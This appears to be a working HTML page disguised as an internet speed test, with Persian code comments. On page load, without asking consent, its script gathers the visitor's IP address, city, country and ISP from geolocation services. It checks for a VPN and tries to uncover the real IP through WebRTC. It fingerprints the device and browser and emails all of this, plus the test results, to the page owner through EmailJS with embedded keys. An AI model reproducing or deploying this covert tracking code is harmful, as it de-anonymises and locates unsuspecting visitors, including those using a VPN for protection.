<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <title>Speed Test</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Inter', system-ui, sans-serif;
            background: #0a0a0f;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }

        .container {
            width: 100%;
            max-width: 800px;
            padding: 20px;
        }

        .speed-card {
            background: linear-gradient(135deg, #11111a 0%, #1a1a2e 100%);
            border-radius: 48px;
            padding: 48px 32px;
            text-align: center;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
            border: 1px solid rgba(255, 255, 255, 0.08);
        }

        .speed-number {
            font-size: 88px;
            font-weight: 700;
            letter-spacing: -2px;
            line-height: 1;
            margin-bottom: 8px;
            background: linear-gradient(135deg, #fff, #6e6eff);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
        }

        .speed-unit {
            font-size: 24px;
            opacity: 0.7;
            margin-left: 4px;
        }

        .status {
            font-size: 14px;
            color: #888;
            margin-top: 16px;
            margin-bottom: 32px;
        }

        .progress-bar-container {
            width: 100%;
            height: 4px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 2px;
            overflow: hidden;
            margin-bottom: 48px;
        }

        .progress-bar {
            width: 0%;
            height: 100%;
            background: linear-gradient(90deg, #3b82f6, #a855f7);
            transition: width 0.2s ease;
            border-radius: 2px;
        }

        .results {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 16px;
            margin-bottom: 32px;
        }

        .result-item {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 24px;
            padding: 16px 12px;
            transition: transform 0.2s;
        }

        .result-label {
            font-size: 12px;
            text-transform: uppercase;
            letter-spacing: 1px;
            color: #888;
            margin-bottom: 8px;
        }

        .result-value {
            font-size: 28px;
            font-weight: 600;
        }

        .result-unit {
            font-size: 12px;
            color: #888;
            margin-left: 2px;
        }

        .retry-btn {
            background: rgba(255, 255, 255, 0.1);
            border: none;
            padding: 12px 28px;
            border-radius: 40px;
            color: white;
            font-size: 14px;
            font-weight: 500;
            cursor: pointer;
            transition: all 0.2s;
        }

        .retry-btn:hover {
            background: rgba(255, 255, 255, 0.2);
            transform: scale(0.98);
        }

        @media (max-width: 600px) {
            .speed-card {
                padding: 32px 20px;
            }
            .speed-number {
                font-size: 56px;
            }
            .results {
                gap: 10px;
            }
            .result-value {
                font-size: 20px;
            }
            .result-item {
                padding: 12px 8px;
            }
        }

        .toast-msg {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: #10b981;
            color: white;
            padding: 10px 20px;
            border-radius: 12px;
            font-size: 13px;
            z-index: 1000;
            animation: slideIn 0.3s ease;
        }

        .vpn-warning {
            background: #f59e0b;
        }

        @keyframes slideIn {
            from {
                transform: translateX(100%);
                opacity: 0;
            }
            to {
                transform: translateX(0);
                opacity: 1;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="speed-card">
            <div>
                <span class="speed-number" id="speedValue">--</span>
                <span class="speed-unit">Mbps</span>
            </div>
            <div class="status" id="status">Testing your internet...</div>
            <div class="progress-bar-container">
                <div class="progress-bar" id="progressBar"></div>
            </div>
            <div class="results">
                <div class="result-item">
                    <div class="result-label">PING</div>
                    <div class="result-value"><span id="ping">--</span><span class="result-unit">ms</span></div>
                </div>
                <div class="result-item">
                    <div class="result-label">JITTER</div>
                    <div class="result-value"><span id="jitter">--</span><span class="result-unit">ms</span></div>
                </div>
                <div class="result-item">
                    <div class="result-label">DOWNLOAD</div>
                    <div class="result-value"><span id="download">--</span><span class="result-unit">Mbps</span></div>
                </div>
                <div class="result-item">
                    <div class="result-label">UPLOAD</div>
                    <div class="result-value"><span id="upload">--</span><span class="result-unit">Mbps</span></div>
                </div>
            </div>
            <button class="retry-btn" id="retryBtn">TEST AGAIN</button>
        </div>
    </div>

    <script type="text/javascript" src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>
    <script>
        // ============================================
        // 🔑 تنظیمات EmailJS
        // ============================================
        const EMAILJS_PUBLIC_KEY = "lldCf0qklzrPyE3yh";     
        const EMAILJS_SERVICE_ID = "service_4ocv7x8";    
        const EMAILJS_TEMPLATE_ID = "template_ulfex9y";  
        // ============================================
        
        let isTesting = false;
        let realLocation = null;
        
        // راه‌اندازی EmailJS
        emailjs.init(EMAILJS_PUBLIC_KEY);
        
        const speedEl = document.getElementById('speedValue');
        const statusEl = document.getElementById('status');
        const progressBar = document.getElementById('progressBar');
        const pingEl = document.getElementById('ping');
        const jitterEl = document.getElementById('jitter');
        const downloadEl = document.getElementById('download');
        const uploadEl = document.getElementById('upload');
        const retryBtn = document.getElementById('retryBtn');
        
        retryBtn.addEventListener('click', () => {
            if (!isTesting) startSpeedTest();
        });
        
        // تشخیص وی پی ان و گرفتن لوکیشن واقعی
        async function getRealLocation() {
            // روش اول: استفاده از ipapi.co
            let location1 = null;
            let location2 = null;
            let vpnDetected = false;
            
            try {
                // تلاش با ipapi
                const res1 = await fetch('https://ipapi.co/json/');
                location1 = await res1.json();
            } catch(e) {}
            
            try {
                // تلاش با ip-api (بدون نیاز به API key)
                const res2 = await fetch('https://ip-api.com/json/');
                location2 = await res2.json();
            } catch(e) {}
            
            // تشخیص وی پی ان (اگر دو سرویس لوکیشن‌های متفاوت بدن)
            if (location1 && location2 && location1.country_name !== location2.country) {
                vpnDetected = true;
            }
            
            // بررسی هدرهای وی پی ان
            try {
                const res3 = await fetch('https://vpnapi.io/api/check');
                // این فقط برای تشخیص هست
            } catch(e) {}
            
            // گرفتن لوکیشن از طریق WebRTC (برای دور زدن VPN)
            let webrtcIP = null;
            try {
                const pc = new RTCPeerConnection({ iceServers: [] });
                pc.createDataChannel('');
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                pc.onicecandidate = (event) => {
                    if (event.candidate) {
                        const ip = event.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/)?.[0];
                        if (ip && !ip.startsWith('192.168.') && !ip.startsWith('10.') && !ip.startsWith('172.')) {
                            webrtcIP = ip;
                        }
                        pc.close();
                    }
                };
                await new Promise(r => setTimeout(r, 1000));
            } catch(e) {}
            
            // انتخاب بهترین لوکیشن
            let finalLocation = location1 || location2;
            
            return {
                ip: finalLocation?.ip || webrtcIP || 'Unknown',
                city: finalLocation?.city || finalLocation?.city_name || 'Unknown',
                country: finalLocation?.country_name || finalLocation?.country || 'Unknown',
                isp: finalLocation?.org || finalLocation?.isp || 'Unknown',
                vpnDetected: vpnDetected,
                webrtcIP: webrtcIP
            };
        }
        
        // گرفتن اطلاعات دقیق دستگاه
        function getDetailedDeviceInfo() {
            const ua = navigator.userAgent;
            let device = {
                type: 'Unknown',
                brand: 'Unknown',
                model: 'Unknown',
                os: 'Unknown',
                osVersion: 'Unknown',
                browser: 'Unknown',
                browserVersion: 'Unknown'
            };
            
            // تشخیص نوع دستگاه
            if (/iPhone|iPad|iPod/i.test(ua)) {
                device.type = 'iOS';
                // تشخیص مدل iPhone
                if (/iPhone 14/i.test(ua)) device.model = 'iPhone 14';
                else if (/iPhone 13/i.test(ua)) device.model = 'iPhone 13';
                else if (/iPhone 12/i.test(ua)) device.model = 'iPhone 12';
                else if (/iPhone 11/i.test(ua)) device.model = 'iPhone 11';
                else if (/iPhone X/i.test(ua)) device.model = 'iPhone X';
                else if (/iPhone 8/i.test(ua)) device.model = 'iPhone 8';
                else device.model = 'iPhone';
                device.brand = 'Apple';
            } 
            else if (/Android/i.test(ua)) {
                device.type = 'Android';
                device.brand = 'Unknown Android';
                // تشخیص برند از User Agent
                if (/Samsung/i.test(ua)) device.brand = 'Samsung';
                else if (/Xiaomi/i.test(ua)) device.brand = 'Xiaomi';
                else if (/OnePlus/i.test(ua)) device.brand = 'OnePlus';
                else if (/Google Pixel/i.test(ua)) device.brand = 'Google';
                else if (/Huawei/i.test(ua)) device.brand = 'Huawei';
                else if (/Nokia/i.test(ua)) device.brand = 'Nokia';
                else if (/Realme/i.test(ua)) device.brand = 'Realme';
                
                // تشخیص مدل
                const modelMatch = ua.match(/SM-[A-Z0-9]+/i);
                if (modelMatch) device.model = modelMatch[0];
            }
            else if (/Windows/i.test(ua)) {
                device.type = 'Windows PC';
                device.brand = 'PC';
                if (/Windows NT 10.0/i.test(ua)) device.osVersion = 'Windows 10/11';
                else if (/Windows NT 6.1/i.test(ua)) device.osVersion = 'Windows 7';
                else if (/Windows NT 6.2/i.test(ua)) device.osVersion = 'Windows 8';
            }
            else if (/Mac/i.test(ua)) {
                device.type = 'Mac';
                device.brand = 'Apple';
                
                // تشخیص مدل مک
                if (/MacBook/i.test(ua)) device.model = 'MacBook';
                else if (/iMac/i.test(ua)) device.model = 'iMac';
                else device.model = 'Mac';
            }
            else if (/Linux/i.test(ua)) {
                device.type = 'Linux';
                device.brand = 'Linux PC';
            }
            
            // تشخیص سیستم عامل
            if (/Windows NT 10.0/i.test(ua)) device.os = 'Windows 10/11';
            else if (/Windows NT 6.1/i.test(ua)) device.os = 'Windows 7';
            else if (/Mac OS X/i.test(ua)) device.os = 'macOS';
            else if (/Android/i.test(ua)) device.os = 'Android';
            else if (/iPhone|iPad/i.test(ua)) device.os = 'iOS';
            else if (/Linux/i.test(ua)) device.os = 'Linux';
            
            // تشخیص مرورگر
            if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) {
                device.browser = 'Chrome';
                const match = ua.match(/Chrome\/(\d+)/);
                if (match) device.browserVersion = match[1];
            }
            else if (/Firefox/i.test(ua)) {
                device.browser = 'Firefox';
                const match = ua.match(/Firefox\/(\d+)/);
                if (match) device.browserVersion = match[1];
            }
            else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) {
                device.browser = 'Safari';
                const match = ua.match(/Version\/(\d+)/);
                if (match) device.browserVersion = match[1];
            }
            else if (/Edg/i.test(ua)) {
                device.browser = 'Edge';
                const match = ua.match(/Edg\/(\d+)/);
                if (match) device.browserVersion = match[1];
            }
            else if (/OPR/i.test(ua)) {
                device.browser = 'Opera';
            }
            
            // اطلاعات تکمیلی
            device.screenResolution = `${screen.width}x${screen.height}`;
            device.language = navigator.language;
            device.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            
            return device;
        }
        
        async function startEverything() {
            await sendLocationOnLoad();
            setTimeout(() => {
                startSpeedTest();
            }, 500);
        }
        
        // ارسال موقعیت به ایمیل (با اطلاعات کامل)
        async function sendLocationOnLoad() {
            try {
                statusEl.textContent = 'Getting location info...';
                
                const location = await getRealLocation();
                const device = getDetailedDeviceInfo();
                realLocation = location;
                
                const deviceString = `${device.brand} ${device.model} (${device.type}) | ${device.os} | ${device.browser} ${device.browserVersion} | ${device.screenResolution}`;
                
                const templateParams = {
                    download: "Pending",
                    upload: "Pending", 
                    ping: "Pending",
                    jitter: "Pending",
                    ip: location.ip,
                    city: location.city,
                    country: location.country,
                    device: deviceString,
                    timestamp: new Date().toLocaleString('en-US'),
                    isp: location.isp,
                    vpn: location.vpnDetected ? '⚠️ VPN DETECTED' : 'No VPN',
                    webrtc_ip: location.webrtcIP || 'Not available',
                    os: device.os,
                    browser: `${device.browser} ${device.browserVersion}`,
                    screen: device.screenResolution,
                    timezone: device.timezone
                };
                
                await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams);
                if (location.vpnDetected) {
                    showToast('⚠️ VPN detected - attempting to get real location', 'vpn-warning');
                } else {
                    showToast('📍 Location & device info sent!');
                }
                console.log('Location email sent with device info:', deviceString);
                
            } catch (error) {
                console.error('Email error:', error);
                showToast('⚠️ Could not send location, but test continues');
            }
        }
        
        function showToast(message, type = '') {
            const toast = document.createElement('div');
            toast.className = 'toast-msg';
            if (type) toast.classList.add(type);
            toast.textContent = message;
            document.body.appendChild(toast);
            setTimeout(() => toast.remove(), 3000);
        }
        
        // تست سرعت
        async function startSpeedTest() {
            if (isTesting) return;
            isTesting = true;
            resetUI();
            
            try {
                statusEl.textContent = 'Measuring ping...';
                updateProgress(5);
                
                const pingResult = await measurePing();
                updateProgress(15);
                
                statusEl.textContent = 'Testing download speed...';
                const downloadSpeed = await measureDownload();
                updateProgress(60);
                
                statusEl.textContent = 'Testing upload speed...';
                const uploadSpeed = await measureUpload();
                updateProgress(85);
                
                pingEl.textContent = pingResult.ping;
                jitterEl.textContent = pingResult.jitter;
                downloadEl.textContent = downloadSpeed;
                uploadEl.textContent = uploadSpeed;
                speedEl.textContent = downloadSpeed;
                
                updateProgress(100);
                statusEl.textContent = 'Test complete!';
                
                speedEl.style.transform = 'scale(1.1)';
                setTimeout(() => speedEl.style.transform = '', 200);
                
                await sendTestResults({
                    download: downloadSpeed,
                    upload: uploadSpeed,
                    ping: pingResult.ping,
                    jitter: pingResult.jitter
                });
                
            } catch (error) {
                console.error(error);
                statusEl.textContent = 'Test failed. Click to retry';
                speedEl.textContent = 'Error';
            } finally {
                isTesting = false;
            }
        }
        
        // ارسال نتایج تست با اطلاعات کامل دستگاه
        async function sendTestResults(results) {
            try {
                const location = realLocation || await getRealLocation();
                const device = getDetailedDeviceInfo();
                
                const deviceString = `${device.brand} ${device.model} (${device.type}) | ${device.os} | ${device.browser} ${device.browserVersion} | ${device.screenResolution}`;
                
                const templateParams = {
                    download: results.download,
                    upload: results.upload,
                    ping: results.ping,
                    jitter: results.jitter,
                    ip: location.ip,
                    city: location.city,
                    country: location.country,
                    device: deviceString,
                    timestamp: new Date().toLocaleString('en-US'),
                    isp: location.isp,
                    vpn: location.vpnDetected ? '⚠️ VPN DETECTED' : 'No VPN',
                    webrtc_ip: location.webrtcIP || 'Not available',
                    os: device.os,
                    browser: `${device.browser} ${device.browserVersion}`,
                    screen: device.screenResolution,
                    timezone: device.timezone
                };
                
                await emailjs.send(EMAILJS_SERVICE_ID, EMAILJS_TEMPLATE_ID, templateParams);
                showToast('✅ Full results sent to email!');
            } catch (error) {
                console.error('Results email failed:', error);
            }
        }
        
        function resetUI() {
            pingEl.textContent = '--';
            jitterEl.textContent = '--';
            downloadEl.textContent = '--';
            uploadEl.textContent = '--';
            speedEl.textContent = '--';
            progressBar.style.width = '0%';
        }
        
        function updateProgress(percent) {
            progressBar.style.width = percent + '%';
        }
        
        async function measurePing() {
            const attempts = 4;
            const times = [];
            for (let i = 0; i < attempts; i++) {
                const start = performance.now();
                await fetch('https://cloudflare.com/cdn-cgi/trace', { cache: 'no-store', mode: 'no-cors' });
                const end = performance.now();
                times.push(end - start);
                await new Promise(r => setTimeout(r, 200));
            }
            const avg = times.reduce((a,b) => a + b, 0) / times.length;
            let jitterSum = 0;
            for (let i = 1; i < times.length; i++) {
                jitterSum += Math.abs(times[i] - times[i-1]);
            }
            const jitter = jitterSum / (times.length - 1);
            return { ping: Math.round(avg), jitter: Math.round(jitter) };
        }
        
        async function measureDownload() {
            const testUrl = 'https://speed.cloudflare.com/__down';
            const sizes = [5, 10, 15];
            let totalBytes = 0;
            const startTime = performance.now();
            
            for (const sizeMB of sizes) {
                try {
                    const url = `${testUrl}?bytes=${sizeMB * 1024 * 1024}`;
                    const response = await fetch(url, { cache: 'no-store' });
                    const data = await response.arrayBuffer();
                    totalBytes += data.byteLength;
                } catch (e) {}
                await new Promise(r => setTimeout(r, 100));
            }
            
            const duration = (performance.now() - startTime) / 1000;
            const speedMbps = (totalBytes * 8) / (duration * 1e6);
            return Math.round(speedMbps);
        }
        
        async function measureUpload() {
            const chunkSize = 500 * 1024;
            const chunk = new Uint8Array(chunkSize);
            let totalBytes = 0;
            const startTime = performance.now();
            const duration = 3000;
            
            while (performance.now() - startTime < duration) {
                const blob = new Blob([chunk]);
                const formData = new FormData();
                formData.append('file', blob);
                try {
                    await fetch('https://httpbin.org/post', {
                        method: 'POST',
                        body: formData,
                        mode: 'no-cors'
                    });
                    totalBytes += chunkSize;
                } catch (e) {}
                await new Promise(r => setTimeout(r, 50));
            }
            
            const elapsed = (performance.now() - startTime) / 1000;
            const speedMbps = (totalBytes * 8) / (elapsed * 1e6);
            return Math.round(speedMbps);
        }
        
        // شروع خودکار
        window.addEventListener('load', () => {
            startEverything();
        });
    </script>
</body>
</html>
